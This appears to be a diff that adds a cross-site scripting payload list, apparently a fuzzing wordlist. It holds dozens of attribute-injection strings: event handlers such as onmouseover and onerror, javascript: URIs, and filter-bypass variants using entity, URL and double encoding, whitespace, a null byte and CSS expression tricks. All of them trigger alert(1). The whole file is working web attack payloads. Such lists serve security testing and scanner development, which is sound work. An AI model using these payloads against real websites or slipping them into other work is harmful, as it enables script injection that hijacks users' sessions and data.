@@ -1,0 +1,58 @@
+" onmouseover="alert(1)
+" onclick="alert(1)
+" onfocus="alert(1)" autofocus="
+" onload="alert(1)
+" onerror="alert(1)
+"onmouseover="alert(1)"x="
+' onmouseover='alert(1)
+' onclick='alert(1)
+' onfocus='alert(1)' autofocus='
+`onmouseover=alert(1)
+" tabindex="1" onfocus="alert(1)"
+javascript:alert(1)
+javascript&#58;alert(1)
+j&#97;vascript:alert(1)
+ja&#118;ascript:alert(1)
+&#106;avascript:alert(1)
+&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)
+java\tscript:alert(1)
+java\nscript:alert(1)
+java\rscript:alert(1)
+java&#9;script:alert(1)
+java&#10;script:alert(1)
+java&#13;script:alert(1)
+" src="x" onerror="alert(1)
+" href="javascript:alert(1)
+" action="javascript:alert(1)
+" formaction="javascript:alert(1)
+" xlink:href="javascript:alert(1)
+" style="background:url('javascript:alert(1)')
+" style="behavior:url(alert(1))
+" style="xss:expression(alert(1))
+# URL-encoded attribute injection
+%22+onmouseover%3d%22alert(1)
+%27+onmouseover%3d%27alert(1)
+%22+onclick%3d%22alert(1)
+# Double encoded
+%2522+onmouseover%253d%2522alert(1)
+# HTML entity in attribute
+&quot; onmouseover=&quot;alert(1)
+# Newline in attribute name bypass
+"
+onmouseover="alert(1)
+# Tab in attribute bypass
+"	onmouseover="alert(1)
+# Null byte in attribute
+"\x00 onmouseover="alert(1)
+# Additional event handlers
+" onpointerover="alert(1)
+" ontouchstart="alert(1)
+" onanimationend="alert(1)
+" ontransitionend="alert(1)
+" onwheel="alert(1)
+" ondragover="alert(1)
+" onpaste="alert(1)
+" oncopy="alert(1)
+" oncut="alert(1)
+" oncontextmenu="alert(1)
+# SRC/HREF URL injection
